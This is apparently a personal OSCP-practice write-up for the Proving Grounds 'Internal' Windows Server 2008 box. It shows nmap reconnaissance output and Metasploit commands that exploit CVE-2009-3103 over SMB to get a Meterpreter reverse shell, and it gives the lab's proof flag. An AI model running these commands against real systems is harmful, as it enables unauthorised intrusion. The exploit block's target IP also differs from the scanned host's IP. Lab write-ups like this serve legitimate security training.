---
Date: 2024-10-23
Platform: PG-Practice
Category: Windows
Difficulty: Easy
Status: In progress
IP: 192.168.240.45
Writeup: https://systemweakness.com/internal-oscp-offensive-security-proving-grounds-practice-easy-9d9152adddc0
---
# Internal
These Windows boxes are getting more and more frustrating. This one I had four separate walkthroughs available and 5 different exploits I could run, and in the end I had to resort to Metasploit to catch a meterpreter shell. Even the Meterpreter shell was a pain in the ass - once I was in I knew I could navigate directly to the Administrator's desktop, but I had to type in each directory change one-by-one rather than going directly to the proof file.

At the moment this is all feeling very fucking frustrating, but I also know that this is a relatively small part of the actual exam - the likelihood that more than one of the stand-alone boxes will be Windows is very low, there's no doubt I'm doing well with Linux, and I know I'm fairly comfortable with AD. 

I've shown myself to be able to do this stuff, so for now just keep trying to break boxes and not lose your cool over how dumb all of this makes you feel - not because you are dumb, but because a whole of of this shit simply doesn't work properly, and you're still trying to figure it all out properly without trying to do it with one hand tied behind your back fixing shit. The temptation to create a whole new VM is very real at the moment, especially if it's from a completely fresh Kali image.

Having to revert the boxes so regularly is really doing my head in too - they absolutely should not be this unstable, but there doesn't seem to be any real way around it. For now I just have to keep working away on this stuff, learn whatever I can from each box (especially by taking these notes), and hope that things will improve later... or I can pass the exam based on the Linux and AD elements, and avoid this unstable Windows bullshit if I can.

# Resolution summary
- Ran Nmap to identify ports `53`,`135`, `139`, `445`, `3389` & `49152-8`
- Identified ports `139` & `445` as running `SMBv2`
- Identified vulnerable SMB version, ran `msfconsole`
- Setup `ms09_050_smb2_negotiate_func_index` exploit and received meterpreter shell
- Navigated to `C:\Users\Administrator\Desktop` and printed `proof.txt`
## Improved skills
- Windows service enumeration
- Testing and running exploits
## Used tools
- nmap
- python
- msfconsole

---
# Information Gathering
Scanned all TCP ports:
```bash
sudo nmap -sC -sV -oN Internal.nmap 192.168.240.45 -v
```

Enumerated open TCP ports:
```bash
PORT      STATE SERVICE            VERSION
53/tcp    open  domain             Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2024-10-23T09:13:15+00:00
|_ssl-date: 2024-10-23T09:13:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=internal
| Issuer: commonName=internal
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2024-08-02T05:18:19
| Not valid after:  2025-02-01T05:18:19
| MD5:   8860:d793:b9ff:62cc:c9c9:8f28:43e0:8b12
|_SHA-1: 45e7:58e2:89db:45a3:1879:41ee:6d4c:6497:fe01:d1d8
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49157/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-10-23T02:13:15-07:00
| smb2-time: 
|   date: 2024-10-23T09:13:15
|_  start_date: 2024-08-03T05:18:18
| nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:ab:5d:14 (VMware)
| Names:
|   INTERNAL<00>         Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  INTERNAL<20>         Flags: <unique><active>
|_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
```
---
# Enumeration
## Port 53 - Domain (Microsoft DNS 6.0.6001)
No enumeration conducted
## Port 135 - MSRPC (Windows RPC)
No enumeration conducted
## Port 139 & 445 - SMB (Windows Netbios-SSN)
- Ran `sudo nmap --script smb-vuln* -p 139,445 192.168.240.45` to identify vulnerabilities in SMB, identified `SMBv2 exploit` (CVE-2009-3103)
![[Pasted image 20241023201127.png]]
## Port 3389 - SSL (MS WBT Server)
No enumeration conducted
## Port 5357 - HTTP (Microsoft HTTPAPI/2.0)
No enumeration conducted
## Ports 49152-8 - MSRPC (Windows RPC)
No enumeration conducted

---
# Exploitation
- Used `msfconsole` and identified `exploit/windows/smb/ms09_050_smb2_negotiate_func_index` as potential exploit for CVE-2009-3103. 
- Ran the following `msfconsole` commands to setup and run exploit before receiving meterpreter shell
```
use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
set RHOSTS 192.168.242.40
set LHOST 192.168.45.199
run
```
![[Pasted image 20241024175717.png]]
- Navigated `C:\Users\Administrator\Desktop\` and ran `cat proof.txt` to print `7ff8cdacb8d95f599362f06e5ce14394`

---
# Trophy & Loot
`proof.txt` = `7ff8cdacb8d95f599362f06e5ce14394`